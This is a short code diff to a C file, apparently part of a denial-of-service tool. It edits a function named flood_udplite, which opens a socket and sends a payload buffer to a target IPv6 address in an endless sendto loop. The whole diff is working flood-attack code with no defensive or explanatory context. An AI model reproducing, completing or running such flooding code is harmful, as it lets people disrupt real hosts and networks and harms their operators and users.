@@ -1,10 +1,13 @@
 #include <stdio.h>
 #include <stdlib.h>
 #include <unistd.h>
+#include <string.h>
 #include <sys/socket.h>
 #include <netinet/in.h>
 #include <arpa/inet.h>
 #include "main.h"
+
+extern char shit[];
 
 int flood_udplite(struct sockaddr_in6 sin) {
   int sock;
@@ -14,7 +17,7 @@ int flood_udplite(struct sockaddr_in6 sin) {
     return EXIT_FAILURE;
   }
   
-  while(sendto(sock, SHIT, sizeof(SHIT), MSG_OOB, (struct sockaddr *)&sin, sizeof(sin)));
+  while(sendto(sock, shit, strlen(shit)+1, MSG_OOB, (struct sockaddr *)&sin, sizeof(sin)));
 
   return EXIT_SUCCESS;
 }
